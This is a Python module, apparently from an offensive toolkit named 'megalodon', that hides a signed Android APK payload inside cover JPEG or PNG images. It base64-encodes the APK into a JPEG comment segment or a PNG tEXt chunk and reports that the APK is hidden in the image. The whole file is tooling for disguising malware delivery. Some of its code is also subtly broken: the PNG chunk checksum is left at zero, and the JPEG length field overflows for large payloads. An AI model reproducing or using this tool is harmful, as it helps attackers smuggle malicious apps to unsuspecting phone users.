import os
import json
import base64
import struct
from pathlib import Path

JPEG_SOI = b'\xFF\xD8'
JPEG_EOI = b'\xFF\xD9'
PNG_SIG = b'\x89PNG\r\n\x1a\n'
JPEG_COMMENT = b'\xFF\xFE'


class ImagePayload:

    def __init__(self):
        self.output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'images'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.target_apk = None
        self.cover_image = None

    def load_config(self):
        cfg = Path('config/megalodon.json')
        if cfg.exists():
            return json.loads(cfg.read_text())
        return {}

    def select_apk(self, apk_path=None):
        if apk_path:
            p = Path(apk_path).expanduser()
            if p.exists() and p.suffix == '.apk':
                self.target_apk = p
                return True
            return False

        default = Path(__file__).parent.parent.parent / 'payloads' / 'android' / 'build' / 'megalodon_signed.apk'
        if default.exists():
            self.target_apk = default
            return True
        return False

    def select_cover_image(self, image_path=None):
        if image_path:
            p = Path(image_path).expanduser()
            if p.exists():
                self.cover_image = p
                return True
            return False

        # Try common defaults
        for candidate in ['cover.jpg', 'cover.png', 'photo.jpg']:
            p = self.output_dir / candidate
            if p.exists():
                self.cover_image = p
                return True

        return False

    def embed_in_jpeg(self, cover_path, apk_path, out_path):
        cover = cover_path.read_bytes()
        apk = apk_path.read_bytes()

        if not cover.startswith(JPEG_SOI):
            raise ValueError('Cover is not a JPEG')

        payload_b64 = base64.b64encode(apk)
        payload_marker = b'<!--APK:' + payload_b64 + b'-->'

        # Insert comment block right after SOI
        new_data = cover[:2] + JPEG_COMMENT + struct.pack('>H', len(payload_marker)) + payload_marker + cover[2:]

        out_path.write_bytes(new_data)
        return out_path

    def embed_in_png(self, cover_path, apk_path, out_path):
        cover = cover_path.read_bytes()
        apk = apk_path.read_bytes()

        if not cover.startswith(PNG_SIG):
            raise ValueError('Cover is not a PNG')

        # PNG tEXt chunk with keyword 'apk'
        keyword = b'apk\x00'
        payload_b64 = base64.b64encode(apk)

        chunk_type = b'tEXt'
        chunk_data = keyword + payload_b64
        chunk = (
            struct.pack('>I', len(chunk_data)) +
            chunk_type +
            chunk_data +
            struct.pack('>I', 0)
        )

        # Insert right before IEND
        iend_pos = cover.rfind(b'IEND') - 4
        new_data = cover[:iend_pos] + chunk + cover[iend_pos:]

        out_path.write_bytes(new_data)
        return out_path
    def generate(self, apk_path=None, cover_path=None):
        if not self.select_apk(apk_path):
            return {'success': False, 'error': 'APK not found. Run payload build-apk + compile-apk first.'}
        if not self.select_cover_image(cover_path):
            return {'success': False, 'error': 'Cover image not found. Provide a real .jpg or .png'}

        suffix = self.cover_image.suffix.lower()
        out = self.output_dir / f'payload{self.cover_image.suffix}'

        try:
            if suffix in ('.jpg', '.jpeg'):
                self.embed_in_jpeg(self.cover_image, self.target_apk, out)
            elif suffix == '.png':
                self.embed_in_png(self.cover_image, self.target_apk, out)
            else:
                return {'success': False, 'error': f'Unsupported format: {suffix}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

        size = out.stat().st_size
        print(f'[+] Image payload created: {out}')
        print(f'[+] Cover: {self.cover_image.name}')
        print(f'[+] Embedded APK: {self.target_apk.name}')
        print(f'[+] Output size: {size / 1024:.1f} KB')

        return {
            'success': True,
            'payload_file': str(out),
            'cover': str(self.cover_image),
            'apk': str(self.target_apk),
            'size_kb': round(size / 1024, 1),
            'type': 'image',
            'note': 'APK is hidden inside the image. Extract with: extract payload <file>'
        }


def generate(apk_path=None, cover_path=None):
    gen = ImagePayload()
    return gen.generate(apk_path, cover_path)
